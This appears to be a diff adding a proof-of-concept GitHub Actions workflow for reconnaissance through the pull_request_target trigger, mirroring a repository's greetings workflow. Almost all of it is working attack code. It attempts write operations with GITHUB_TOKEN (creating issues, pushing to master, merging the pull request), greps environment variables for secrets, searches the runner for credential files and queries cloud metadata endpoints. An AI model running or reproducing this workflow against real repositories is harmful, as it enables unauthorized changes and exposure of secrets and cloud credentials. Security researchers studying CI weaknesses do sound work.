@@ -1,0 +1,130 @@
+# PoC: pull_request_target recon — mirrors greetings.yml trigger
+# The original uses actions/first-interaction@v1 with GITHUB_TOKEN.
+# No permissions: block → inherits default_workflow_permissions.
+
+name: "PoC: PRT Recon (greetings trigger)"
+
+on:
+  pull_request_target:
+    types: [opened]
+
+jobs:
+  recon:
+    runs-on: ubuntu-latest
+    steps:
+      # ── 1. Event metadata ──────────────────────────────────────────
+      - name: "[recon] PR event metadata"
+        run: |
+          echo "=== pull_request_target event context ==="
+          echo "event_name:       ${{ github.event_name }}"
+          echo "action:           ${{ github.event.action }}"
+          echo "repo:             ${{ github.repository }}"
+          echo "base_ref:         ${{ github.event.pull_request.base.ref }}"
+          echo "head_repo:        ${{ github.event.pull_request.head.repo.full_name }}"
+          echo "head_sha:         ${{ github.event.pull_request.head.sha }}"
+          echo "pr_number:        ${{ github.event.pull_request.number }}"
+          echo "pr_author:        ${{ github.event.pull_request.user.login }}"
+          echo "actor:            ${{ github.actor }}"
+          echo "is_fork_pr:       ${{ github.event.pull_request.head.repo.full_name != github.repository }}"
+
+      # ── 2. GITHUB_TOKEN permission probe ───────────────────────────
+      # greetings.yml has NO permissions: block.
+      # default_workflow_permissions for this repo is "read".
+      # But we probe exhaustively to confirm.
+      - name: "[recon] GITHUB_TOKEN scope enumeration"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "=== Token permission probe (no permissions: block) ==="
+
+          echo "--- read repo ---"
+          curl -s -o /dev/null -w "HTTP %{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/${{ github.repository }}" && echo
+
+          echo "--- list PRs ---"
+          curl -s -o /dev/null -w "HTTP %{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/${{ github.repository }}/pulls?per_page=1" && echo
+
+          echo "--- list secrets (admin) ---"
+          curl -s -o /dev/null -w "HTTP %{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/secrets" && echo
+
+          echo "--- create issue ---"
+          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X POST \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d '{"title":"[poc-prt-recon] greetings probe","body":"delete me"}' \
+            "https://api.github.com/repos/${{ github.repository }}/issues")
+          echo "create issue: HTTP $STATUS"
+
+          echo "--- create comment on PR ---"
+          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X POST \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d '{"body":"[poc-prt-recon] token write probe"}' \
+            "https://api.github.com/repos/${{ github.repository }}/issues/${{ github.event.pull_request.number }}/comments")
+          echo "create PR comment: HTTP $STATUS"
+
+          echo "--- push file ---"
+          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X PUT \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d '{"message":"poc probe","content":"dGVzdA==","branch":"master"}' \
+            "https://api.github.com/repos/${{ github.repository }}/contents/.poc-probe-delete-me")
+          echo "push file to master: HTTP $STATUS"
+
+          echo "--- merge PR ---"
+          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X PUT \
+            -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/${{ github.repository }}/pulls/${{ github.event.pull_request.number }}/merge")
+          echo "merge PR: HTTP $STATUS"
+
+          echo "--- read branch protection ---"
+          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/${{ github.repository }}/branches/master/protection")
+          echo "branch protection: HTTP $STATUS"
+
+      # ── 3. Environment variables ───────────────────────────────────
+      - name: "[recon] Environment variables"
+        run: |
+          echo "=== Sensitive-pattern env vars ==="
+          env | sort | grep -iE 'TOKEN|SECRET|KEY|PASS|CRED|AUTH|AZURE|AWS|GCP' || true
+          echo ""
+          echo "=== All GITHUB_ vars ==="
+          env | grep ^GITHUB_ | sort
+          echo ""
+          echo "=== All RUNNER_ vars ==="
+          env | grep ^RUNNER_ | sort
+
+      # ── 4. Filesystem recon ────────────────────────────────────────
+      - name: "[recon] Runner filesystem"
+        run: |
+          echo "=== Runner identity ==="
+          whoami && id
+          echo ""
+          echo "=== Credential files ==="
+          find $HOME -maxdepth 3 \( -name '*.json' -o -name '*.pem' -o -name '*.key' \
+               -o -name '.env*' -o -name '*token*' -o -name '*cred*' \
+               -o -name '.netrc' -o -name '.npmrc' \) 2>/dev/null | head -20
+          echo ""
+          echo "=== Git config ==="
+          git config --global --list 2>/dev/null || echo "(none)"
+
+      # ── 5. Network / cloud metadata ────────────────────────────────
+      - name: "[recon] Network recon"
+        run: |
+          echo "=== Public IP ==="
+          curl -s https://ifconfig.me && echo
+          echo ""
+          echo "=== Cloud IMDS probes ==="
+          curl -s -m 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo "(not AWS)"
+          curl -s -m 2 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null || echo "(not Azure)"
+          curl -s -m 2 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/" 2>/dev/null || echo "(not GCP)"
